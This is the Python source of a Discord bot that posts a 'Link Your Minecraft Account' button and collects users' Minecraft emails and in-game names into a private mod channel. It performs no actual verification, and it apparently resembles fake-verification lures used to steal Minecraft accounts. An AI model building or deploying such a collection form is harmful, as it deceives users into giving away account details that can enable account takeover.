import os
import discord
from discord.ext import commands

TOKEN = os.getenv("DISCORD_TOKEN")  # Loaded from environment variable (Render will inject this)
VERIFICATION_CHANNEL_ID = 1362951881827160295  # Verification channel ID
MOD_CHANNEL_ID = 1362997933552959558  # Mod channel ID

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.messages = True
intents.dm_messages = True

bot = commands.Bot(command_prefix='!', intents=intents)

pending_codes = {}  # user_id: initiator_id

class VerifyModal(discord.ui.Modal, title="Link Your Minecraft Account"):
    email = discord.ui.TextInput(label="Minecraft Email", placeholder="example@gmail.com", required=True)
    ign = discord.ui.TextInput(label="Minecraft IGN", placeholder="YourInGameName", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        # Send verification info to mod channel
        log_channel = await bot.fetch_channel(MOD_CHANNEL_ID)

        embed = discord.Embed(
            title="🔗 New Minecraft Verification",
            color=discord.Color.orange()
        )
        embed.add_field(name="User", value=interaction.user.mention, inline=False)
        embed.add_field(name="Email", value=self.email.value, inline=False)
        embed.add_field(name="IGN", value=self.ign.value, inline=False)
        embed.set_footer(text="This is an automated message.")

        await log_channel.send(embed=embed)
        await interaction.response.send_message("✅ Info submitted! Thanks!", ephemeral=True)

class LinkView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Link Account", style=discord.ButtonStyle.primary)
    async def link_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerifyModal())

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} (ID: {bot.user.id})')
    print('Bot is ready!')
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} slash commands.")
    except Exception as e:
        print(f"Error syncing commands: {e}")

    # Auto-send embed to verification channel
    verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)
    embed = discord.Embed(
        title="🔗 Link Your Minecraft Account",
        description="Click the **Link Account** button below to start verification.",
        color=discord.Color.green()
    )
    embed.set_footer(text="This is an automated message.")
    await verification_channel.send(embed=embed, view=LinkView())

@bot.tree.command(name="setup", description="Start the Minecraft account verification process")
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔗 Link Your Minecraft Account",
        description="Click the **Link Account** button below to start verification.",
        color=discord.Color.green()
    )
    embed.set_footer(text="This is an automated message.")
    await interaction.response.send_message(embed=embed, view=LinkView())

bot.run(TOKEN)
